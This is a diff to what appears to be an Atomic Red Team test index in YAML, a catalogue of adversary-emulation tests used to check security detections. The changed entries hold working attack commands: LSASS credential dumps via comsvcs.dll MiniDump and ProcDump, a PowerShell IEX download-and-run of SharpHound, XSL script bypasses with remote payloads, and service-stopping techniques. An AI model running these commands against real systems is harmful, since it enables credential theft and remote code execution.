@@ -12917,7 +12917,8 @@ defense-evasion:
     - name: MSXSL Bypass using local files
       description: 'Executes the code specified within a XSL script tag during XSL
         transformation using a local payload. Requires download of MSXSL from Microsoft
-        at https://www.microsoft.com/en-us/download/details.aspx?id=21714.
+        at https://www.microsoft.com/en-us/download/details.aspx?id=21714. Open Calculator.exe
+        when test sucessfully executed, while AV turned off.
 
 '
       supported_platforms:
@@ -12951,7 +12952,8 @@ defense-evasion:
     - name: MSXSL Bypass using remote files
       description: 'Executes the code specified within a XSL script tag during XSL
         transformation using a remote payload. Requires download of MSXSL from Microsoft
-        at https://www.microsoft.com/en-us/download/details.aspx?id=21714.
+        at https://www.microsoft.com/en-us/download/details.aspx?id=21714. Open Calculator.exe
+        when test sucessfully executed, while AV turned off.
 
 '
       supported_platforms:
@@ -12995,12 +12997,13 @@ defense-evasion:
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/wmicscript.xsl" -OutFile "#{local_xsl_file}"
       executor:
         name: command_prompt
-        command: 'wmic.exe #{wmic_command} /FORMAT:#{local_xsl_file}
+        command: 'wmic #{wmic_command} /FORMAT:"#{local_xsl_file}"
 
 '
     - name: WMIC bypass using remote XSL file
       description: 'Executes the code specified within a XSL script using a remote
-        payload.
+        payload. Open Calculator.exe when test sucessfully executed, while AV turned
+        off.
 
 '
       supported_platforms:
@@ -13016,7 +13019,7 @@ defense-evasion:
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl
       executor:
         name: command_prompt
-        command: 'wmic.exe #{wmic_command} /FORMAT:#{remote_xsl_file}
+        command: 'wmic #{wmic_command} /FORMAT:"#{remote_xsl_file}"
 
 '
 privilege-escalation:
@@ -16377,9 +16380,10 @@ impact:
       identifier: T1489
     atomic_tests:
     - name: Windows - Stop service using Service Controller
-      description: 'Stops a specified service using the sc.exe command.
-
-'
+      description: |
+        Stops a specified service using the sc.exe command. Upon execution, if the spooler service was running infomration will be displayed saying
+        it has changed to a state of STOP_PENDING. If the spooler service was not running "The service has not been started." will be displayed and it can be
+        started by running the cleanup command.
       supported_platforms:
       - windows
       input_arguments:
@@ -16397,9 +16401,10 @@ impact:
 
 '
     - name: Windows - Stop service using net.exe
-      description: 'Stops a specified service using the net.exe command.
-
-'
+      description: |
+        Stops a specified service using the net.exe command. Upon execution, if the service was running "The Print Spooler service was stopped successfully."
+        will be displayed. If the service was not running, "The Print Spooler service is not started." will be displayed and it can be
+        started by running the cleanup command.
       supported_platforms:
       - windows
       input_arguments:
@@ -16417,8 +16422,11 @@ impact:
 
 '
     - name: Windows - Stop service by killing process
-      description: "Stops a specified service killng the service's process. \nThis
-        technique was used by WannaCry.\n"
+      description: |
+        Stops a specified service killng the service's process.
+        This technique was used by WannaCry. Upon execution, if the spoolsv service was running "SUCCESS: The process "spoolsv.exe" with PID 2316 has been terminated."
+        will be displayed. If the service was not running "ERROR: The process "spoolsv.exe" not found." will be displayed and it can be
+        started by running the cleanup command.
       supported_platforms:
       - windows
       input_arguments:
@@ -20050,7 +20058,7 @@ credential-access:
         The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
         ProcDump.
 
-        Upon successful execution, you should see a file the following file created C:\Windows\Temp\lsass_dump.dmp.
+        Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.
 
         If you see a message saying "procdump.exe is not recognized as an internal or external command", try using the  get-prereq_commands to download and install the ProcDump tool first.
       supported_platforms:
@@ -20079,6 +20087,23 @@ credential-access:
         name: command_prompt
         command: "#{procdump_exe} -accepteula -ma lsass.exe #{output_file}\n"
         cleanup_command: 'del "#{output_file}" >nul 2> nul
+
+'
+    - name: Dump LSASS.exe Memory using comsvcs.dll
+      description: |
+        The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.
+
+        Upon successful execution, you should see the following file created $env:TEMP\lsass-comsvcs.dmp.
+      supported_platforms:
+      - windows
+      executor:
+        elevation_required: true
+        name: powershell
+        command: 'C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll,
+          MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full
+
+'
+        cleanup_command: 'Remove-Item $env:TEMP\lsass-comsvcs.dmp -ErrorAction Ignore
 
 '
     - name: Dump LSASS.exe Memory using Windows Task Manager
@@ -23065,10 +23090,13 @@ execution:
           type: url
           default: https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: false
-        command: 'powershell.exe "IEX (New-Object Net.WebClient).DownloadString(''#{bloodurl}'');
-          Invoke-BloodHound"
+        command: 'IEX (New-Object Net.WebClient).DownloadString(''#{bloodurl}'');
+          Invoke-BloodHound
+
+'
+        cleanup_command: 'Remove-Item $env:temp\*BloodHound.zip -Force
 
 '
     - name: Obfuscation Tests
@@ -24140,7 +24168,7 @@ execution:
       dependencies:
       - description: PsExec tool from Sysinternals must exist on disk at specified
           location (#{psexec_exe})
-        prereq_command: if (Test-Path "#{psexec_exe}"") { exit 0} else { exit 1}
+        prereq_command: if (Test-Path "#{psexec_exe}") { exit 0} else { exit 1}
         get_prereq_command: |-
           Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
           Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
@@ -25536,7 +25564,8 @@ execution:
     - name: MSXSL Bypass using local files
       description: 'Executes the code specified within a XSL script tag during XSL
         transformation using a local payload. Requires download of MSXSL from Microsoft
-        at https://www.microsoft.com/en-us/download/details.aspx?id=21714.
+        at https://www.microsoft.com/en-us/download/details.aspx?id=21714. Open Calculator.exe
+        when test sucessfully executed, while AV turned off.
 
 '
       supported_platforms:
@@ -25570,7 +25599,8 @@ execution:
     - name: MSXSL Bypass using remote files
       description: 'Executes the code specified within a XSL script tag during XSL
         transformation using a remote payload. Requires download of MSXSL from Microsoft
-        at https://www.microsoft.com/en-us/download/details.aspx?id=21714.
+        at https://www.microsoft.com/en-us/download/details.aspx?id=21714. Open Calculator.exe
+        when test sucessfully executed, while AV turned off.
 
 '
       supported_platforms:
@@ -25614,12 +25644,13 @@ execution:
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/wmicscript.xsl" -OutFile "#{local_xsl_file}"
       executor:
         name: command_prompt
-        command: 'wmic.exe #{wmic_command} /FORMAT:#{local_xsl_file}
+        command: 'wmic #{wmic_command} /FORMAT:"#{local_xsl_file}"
 
 '
     - name: WMIC bypass using remote XSL file
       description: 'Executes the code specified within a XSL script using a remote
-        payload.
+        payload. Open Calculator.exe when test sucessfully executed, while AV turned
+        off.
 
 '
       supported_platforms:
@@ -25635,7 +25666,7 @@ execution:
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl
       executor:
         name: command_prompt
-        command: 'wmic.exe #{wmic_command} /FORMAT:#{remote_xsl_file}
+        command: 'wmic #{wmic_command} /FORMAT:"#{remote_xsl_file}"
 
 '
 lateral-movement:
